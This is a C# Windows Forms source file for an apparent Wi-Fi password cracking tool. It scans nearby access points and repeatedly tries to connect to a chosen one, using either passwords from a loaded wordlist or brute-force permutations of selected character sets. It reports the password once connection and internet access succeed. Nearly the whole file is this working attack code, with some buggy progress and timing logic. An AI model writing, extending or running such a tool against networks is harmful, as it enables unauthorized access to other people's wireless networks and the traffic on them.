using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using SimpleWifi;
using NativeWifi;
using System.Reflection;
using System.Collections.ObjectModel;
using System.Net;
using System.Threading;
using System.Text.RegularExpressions;
using System.Diagnostics;

namespace Wifi_Bruteforce
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private static Wifi wifi;
        WlanClient wlan = new WlanClient();
        List<string> passwords = new List<string>();

        private String Alphaup = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        private String Alphalow = "abcdefghijklmnopqrstuvwxyz";
        private String num = "0123456789";
        private String splchar = "~!@#$%^&*()_+`-={}|[]:;'<>?,.";
        private String output = "";

        Thread t;

        private static int count = 0;
        //private static int count1 = 0;
        private void Form1_Load(object sender, EventArgs e)
        {
            wifi = new Wifi();
            wifi.ConnectionStatusChanged += wifi_ConnectionStatusChanged;
            List();

            lowercase.Checked = false;
            uppercase.Checked = false;
            digits.Checked = false;
            symbols.Checked = false;
            userDefined.Checked = false;
            userDefined.Enabled = false;

            comboBox1.SelectedIndex = 0;

            pauseAttack.Enabled = false;
            stopAttack.Enabled = false;

            //timer1.Interval = 100;
        }
        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBox1.SelectedIndex == 0)
            {
                tabPage5.Enabled = true;
                tabPage6.Enabled = true;
                tabPage7.Enabled = false;
                tabPage8.Enabled = true;

                mask.Enabled = false;

                startAttack.Text = "Start Brute-force";
                pauseAttack.Text = "Pause Brute-force";
                stopAttack.Text = "Stop Brute-force";
            }
            if (comboBox1.SelectedIndex == 1)
            {
                tabPage5.Enabled = true;
                tabPage6.Enabled = false;
                tabPage7.Enabled = false;
                tabPage8.Enabled = true;

                mask.Enabled = true;
            }
            if (comboBox1.SelectedIndex == 2)
            {
                tabPage5.Enabled = false;
                tabPage6.Enabled = false;
                tabPage7.Enabled = true;
                tabPage8.Enabled = true;

                mask.Enabled = false;


                startAttack.Text = "Start Dictionary Attack";
                pauseAttack.Text = "Pause Dictionary Attack";
                stopAttack.Text = "Stop Dictionary Attack";
            }
            if (comboBox1.SelectedIndex == 3)
            {
                tabPage5.Enabled = false;
                tabPage6.Enabled = true;
                tabPage7.Enabled = false;
                tabPage8.Enabled = true;

                mask.Enabled = false;
            }
        }
        private void spaces_CheckedChanged(object sender, EventArgs e)
        {
            if (spaces.Checked)
                output += " ";
            else
                output = Regex.Replace(output, "[ ]", "");
        }

        private void digits_CheckedChanged(object sender, EventArgs e)
        {
            if (digits.Checked)
                output += num;
            else
                output = Regex.Replace(output, "[0-9]", "");
        }

        private void lowercase_CheckedChanged(object sender, EventArgs e)
        {
            if (lowercase.Checked)
                output += Alphalow;
            else
                output = Regex.Replace(output, "[a-z]", "");
        }

        private void uppercase_CheckedChanged(object sender, EventArgs e)
        {
            if (uppercase.Checked)
                output += Alphaup;
            else
                output = Regex.Replace(output, "[A-Z]", "");
        }

        private void symbols_CheckedChanged(object sender, EventArgs e)
        {
            if (symbols.Checked)
                output = output + splchar;
            else
                output = Regex.Replace(output, "[^a-zA-Z0-9]", "");
        }

        private delegate void SetControlPropertyThreadSafeDelegate(
        Control control,
        string propertyName,
        object propertyValue);

        public static void SetControlPropertyThreadSafe(
                Control control,
                string propertyName,
                object propertyValue)
        {
            if (control.InvokeRequired)
            {
                control.Invoke(new SetControlPropertyThreadSafeDelegate
                (SetControlPropertyThreadSafe),
                new object[] { control, propertyName, propertyValue });
            }
            else
            {
                control.GetType().InvokeMember(
                        propertyName,
                        BindingFlags.SetProperty,
                        null,
                        control,
                        new object[] { propertyValue });
            }
        }

        private bool check(AccessPoint selectedAP)
        {
            Collection<String> connectedSsids = new Collection<string>();
            if (WifiStatus.Connected.ToString() == "Connected")
            {
                foreach (WlanClient.WlanInterface wlanInterface in wlan.Interfaces)
                {
                    try
                    {
                        Wlan.Dot11Ssid ssid = wlanInterface.CurrentConnection.wlanAssociationAttributes.dot11Ssid;
                        connectedSsids.Add(new String(Encoding.ASCII.GetChars(ssid.SSID, 0, (int)ssid.SSIDLength)));
                    }
                    catch (Exception)
                    {
                        return false;
                    }
                }
                foreach (string ssid in connectedSsids)
                {
                    if (selectedAP.Name == ssid)
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
            }
            return false;
        }

        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        private IEnumerable<AccessPoint> List()
        {
            IEnumerable<AccessPoint> accessPoints = wifi.GetAccessPoints().OrderByDescending(ap => ap.SignalStrength);
            foreach (AccessPoint ap in accessPoints)
            {
                ListViewItem lvItem = new ListViewItem(ap.Name);
                lvItem.SubItems.Add(ap.SignalStrength + "%");

                lvItem.Tag = ap;
                listView1.Items.Add(lvItem);
            }
            return accessPoints;
        }

        private IEnumerable<AccessPoint> Scan()
        {
            IEnumerable<AccessPoint> accessPoints = wifi.GetAccessPoints().OrderByDescending(ap => ap.SignalStrength);
            return accessPoints;
        }

        private static void wifi_ConnectionStatusChanged(object sender, WifiStatusEventArgs e)
        {
            Console.WriteLine("\nNew status: {0}", e.NewStatus.ToString());
        }

        private void OnConnectedComplete(bool success)
        {
            Console.WriteLine("\nOnConnectedComplete, success: {0}", success);
        }
        private void dictionary_crack(AccessPoint selectedAP)
        {
            if (passwords.Count == 0)
            {
                MessageBox.Show("Please Select a Wordlist");
                return;
            }

            foreach (string pass in passwords)
            {
                SetControlPropertyThreadSafe(label4, "Text", pass);

                SetControlPropertyThreadSafe(label5, "Text", count.ToString());
                count++;

                // Auth
                AuthRequest authRequest = new AuthRequest(selectedAP);
                bool overwrite = true;

                if (authRequest.IsPasswordRequired)
                {
                    if (overwrite)
                    {
                        if (authRequest.IsUsernameRequired)
                        {
                            Console.Write("\r\nPlease enter a username: ");
                            authRequest.Username = Console.ReadLine();
                        }
                        authRequest.Password = pass;

                        if (authRequest.IsDomainSupported)
                        {
                            Console.Write("\r\nPlease enter a domain: ");
                            authRequest.Domain = Console.ReadLine();
                        }
                    }
                }

                selectedAP.ConnectAsync(authRequest, overwrite, OnConnectedComplete);
                int i = Convert.ToInt32(textBox1.Text);
                Thread.Sleep(i * 1000);
                if (check(selectedAP) == true && CheckForInternetConnection() == true)
                {
                    var timeEnded = DateTime.Now;
                    SetControlPropertyThreadSafe(label4, "Text", pass);
                    MessageBox.Show("Password is :" + pass, "Wifi Bruteforce", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    SetControlPropertyThreadSafe(label34, "Text", timeEnded.ToString());
                    return;
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start(e.Link.LinkData.ToString());
        }

        private void button3_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
            List();
        }

        private void button7_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
            List();
        }

        //Dictionary
        private void button4_Click(object sender, EventArgs e)
        {
            OpenFileDialog oFile = new OpenFileDialog();
            openFileDialog1.InitialDirectory = "c:\\";
            openFileDialog1.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
            openFileDialog1.FilterIndex = 2;
            openFileDialog1.RestoreDirectory = true;
            string path;
            if (oFile.ShowDialog() == DialogResult.OK)
            {
                path = oFile.FileName;
                int counter = 0;
                string line;
                System.IO.StreamReader file = new System.IO.StreamReader(path);
                while ((line = file.ReadLine()) != null)
                {
                    passwords.Add(line);
                    counter++;
                }
                file.Close();
            }
        }

        //Bruteforce
        private void startAttack_Click(object sender, EventArgs e)
        {
            var timeStarted = DateTime.Now;
            label25.Text = timeStarted.ToString();

            var accessPoints = Scan();
            AccessPoint selectedAP = null;

            foreach (AccessPoint ap in accessPoints)
            {
                if (ap.Name == listView1.SelectedItems[0].Text)
                {
                    selectedAP = ap;
                }
            }

            if (comboBox1.SelectedIndex == 0)
            {
                startAttack.Enabled = false;
                pauseAttack.Enabled = true;
                stopAttack.Enabled = true;

                try
                {
                    t = new Thread(() => bruteforce_crack(selectedAP));
                    t.IsBackground = true;
                    t.Start();
                }
                catch (Exception a)
                {
                    MessageBox.Show(a.ToString());
                }
            }

            if (comboBox1.SelectedIndex == 1)
            {
                try
                {
                    t = new Thread(() => dictionary_crack(selectedAP));
                    t.IsBackground = true;
                    t.Start();
                }
                catch (Exception a)
                {
                    MessageBox.Show(a.ToString());
                }
            }
        }

        ulong permutations = 0;
        public void bruteforce_crack(AccessPoint selectedAP)
        {
            //ulong permutations = 0;

            char[] arr = output.ToCharArray();
            int max = Convert.ToInt32(numericUpDown2.Value);
            int min = Convert.ToInt32(numericUpDown1.Value);

            for (int i = min; i <= max; i++)
            {
                permutations += (ulong)Math.Pow(arr.Count(), i);
            }
            SetControlPropertyThreadSafe(label31, "Text", permutations.ToString());

            for (int i = min; i <= max; i++)
            {
                bruteforce(arr, "", 0, i, selectedAP);
            }
        }
  
        Stopwatch sw = new Stopwatch();
        int elapsedSec = 0;
        int estimatedTime = 0;
        int passwordLeft = 0;
        int speed = 0;
        //int progress = 0;
        private void bruteforce(char[] fin, String pwd, int pos, int length, AccessPoint selectedAP)
        {
            //timer1.Start();
            Stopwatch st = new Stopwatch();
            st.Start();

            sw.Start();

            if (pos < length)
            {
                foreach (char ch in fin)
                {
                    bruteforce(fin, pwd + ch, pos + 1, length, selectedAP);

                    elapsedSec = Convert.ToInt32(sw.Elapsed.TotalSeconds);

                    // Auth
                    AuthRequest authRequest = new AuthRequest(selectedAP);
                    bool overwrite = true;

                    if (authRequest.IsPasswordRequired)
                    {
                        if (overwrite)
                        {
                            if (authRequest.IsUsernameRequired)
                            {
                                Console.Write("\r\nPlease enter a username: ");
                                authRequest.Username = Console.ReadLine();
                            }
                            authRequest.Password = pwd;

                            if (authRequest.IsDomainSupported)
                            {
                                Console.Write("\r\nPlease enter a domain: ");
                                authRequest.Domain = Console.ReadLine();
                            }
                        }
                    }

                    selectedAP.ConnectAsync(authRequest, overwrite, OnConnectedComplete);
                }

                try
                {
                    SetControlPropertyThreadSafe(label4, "Text", pwd);

                    SetControlPropertyThreadSafe(label5, "Text", count.ToString());
                    count++;

                    speed = count / elapsedSec;
                    SetControlPropertyThreadSafe(label23, "Text", speed + " passwords/s");

                    passwordLeft = (int)permutations - count;
                    /*estimatedTime = speed * (int)permutations - passwordLeft * speed;*/
                    /*estimatedTime = ((int)permutations * speed - passwordLeft) * speed;*/

                    //estimatedTime = ((int)permutations - passwordLeft) / speed;
                    estimatedTime = (passwordLeft * 100) / (int)permutations;

                    /*SetControlPropertyThreadSafe(progressBar1, "Maximum", (int)permutations);
                    SetControlPropertyThreadSafe(progressBar1, "Value", estimatedTime);
                    SetControlPropertyThreadSafe(label30, "Text", estimatedTime.ToString() + "%");*/

                    SetControlPropertyThreadSafe(progressBar1, "Value", 0);
                    SetControlPropertyThreadSafe(progressBar1, "Step", 1);
                    SetControlPropertyThreadSafe(progressBar1, "Minimum", 0);

                    /*progressBar1.Value = 0;
                    progressBar1.Step = 1;
                    progressBar1.Minimum = 0;
                    progressBar1.Maximum = 5000;*/
                    
                    while (st.Elapsed < TimeSpan.FromSeconds(1))
                    {
                        count++;
                        //SetControlPropertyThreadSafe(progressBar1, "Value", progressBar1.Value++);
                        progress += 1;
                        SetControlPropertyThreadSafe(progressBar1, "Value", progress);
                    }
                    SetControlPropertyThreadSafe(progressBar1, "Maximum", (int)permutations);

                    if (check(selectedAP) == true && CheckForInternetConnection() == true)
                    {
                        var timeEnded = DateTime.Now;
                        SetControlPropertyThreadSafe(label4, "Text", pwd);
                        MessageBox.Show("Password is :" + pwd, "Wifi Bruteforce", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        SetControlPropertyThreadSafe(label34, "Text", timeEnded.ToString());
                        sw.Stop();
                        return;
                    }
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.Message);
                }
            }
        }
        /*public void UpdateProgres(int _value)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<int>(UpdateProgres), _value);
                return;
            }

            progressBar1.Value = _value;
            progressBar1.Maximum = (int)permutations;
        }*/
        private void pauseAttack_Click(object sender, EventArgs e)
        {
            if (pauseAttack.Text == "Pause Brute-force")
            {
                pauseAttack.Text = "Resume Brute-force";
                t.Suspend();
            }
            else if (pauseAttack.Text == "Resume Brute-force")
            {
                pauseAttack.Text = "Pause Brute-force";
                t.Resume();
            }
        }

        private void stopAttack_Click(object sender, EventArgs e)
        {
            startAttack.Enabled = true;
            pauseAttack.Enabled = false;
            stopAttack.Enabled = false;

            t.Abort();
        }

        private void button7_MouseEnter(object sender, EventArgs e)
        {
            button7.BackColor = Color.FromArgb(64, 64, 64);
        }
        private void button7_MouseLeave(object sender, EventArgs e)
        {
            button7.BackColor = Color.White;
        }

        int progress = 0;
        private void timer1_Tick(object sender, EventArgs e)
        {
            //progressBar1.Value += 1;
            progress += 1;
            SetControlPropertyThreadSafe(progressBar1, "Value", progress);
            //SetControlPropertyThreadSafe(progressBar1, "Value", estimatedTime+1);

            /*SetControlPropertyThreadSafe(progressBar1, "Maximum", (int)permutations);
            SetControlPropertyThreadSafe(progressBar1, "Value", estimatedTime + 1);
            SetControlPropertyThreadSafe(label30, "Text", estimatedTime.ToString() + "%");*/
        }
    }
}
